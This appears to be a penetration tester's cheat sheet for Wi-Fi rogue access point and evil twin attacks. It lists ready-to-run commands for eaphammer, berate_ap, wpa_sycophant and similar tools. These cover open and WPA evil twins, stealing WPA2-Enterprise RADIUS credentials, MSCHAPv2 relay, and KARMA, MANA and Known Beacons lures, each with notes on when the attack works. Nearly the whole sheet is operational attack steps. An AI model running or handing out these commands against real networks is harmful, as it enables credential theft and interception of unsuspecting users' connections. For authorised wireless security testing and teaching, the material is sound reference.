# Rogue AP / Evil Twin

## Basic Open Hotspot

```bash
berate_ap <interface_AP> <interface_internet> <SSID>
```

---

## Open Network Evil Twin

```bash
# Using airgeddon
airgeddon.sh

# Using fluxion
fluxion.sh

# Using wifipumpkin3
wifipumpkin3

# Using eaphammer
eaphammer -i wlan0 --channel <channel_number> --auth-open --essid <SSID>
```

---

## WPA/WPA2-Personal Evil Twin

### WPA Passphrase Known

```bash
eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk --essid <SSID> --wpa-passphrase <passphrase>
```

### WPA Passphrase Unknown

Spawn Open Network Evil Twin instead to attack clients (e.g. Phishing attack to retrieve Passphrase) → **Open Network Evil Twin**

Capture WPA (half) Handshake of connecting clients & Cracking:

```bash
eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk --essid <SSID> --wpa-passphrase <passphrase>
```

---

## WPA2 Enterprise Attack

### RADIUS Credentials Unknown

**RADIUS Credentials Stealing:**
```bash
eaphammer --cert-wizard
eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID> --creds
```

> **Possible if:**
> - EAP method does not use client-certificate for client authentication
> - Server certificate validation not enforced on client

**EAP (MSCHAPv2) Relay:**
```bash
berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout <file_captured_creds> <interface>
wpa_sycophant.sh -c wpa_sycophant_example.conf -i <interface>
```

> **Possible if:**
> - Target network uses EAP method with MSCHAPv2 for client authentication
> - Server certificate validation not enforced on client

### RADIUS Credentials Known

```bash
# Add credentials in db
ehdb --add --identity <username> --password <password>

# Add creds with NTLM hash
ehdb --add --identity <username> --nt-hash <ntlm_hash>

# Start evil twin
eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID_corporate_wifi>
```

---

## 802.11 Network Selection Algorithms (for Open Network)

### KARMA Attack (outdated)

By default using **wifiphisher**

### MANA Attack (KARMA Improvement)

Add `--mana` option in `eaphammer` command

### Loud MANA (MANA Improvement)

Add `--mana --loud` in `eaphammer` command

> **Notes:** KARMA, MANA, Loud MANA Attack abuse client's **active probing**

### Known Beacons Attack

Add `--mana --known-beacons` in `eaphammer` command

> **Notes:** Known Beacons Attack abuse client's **passive scanning**
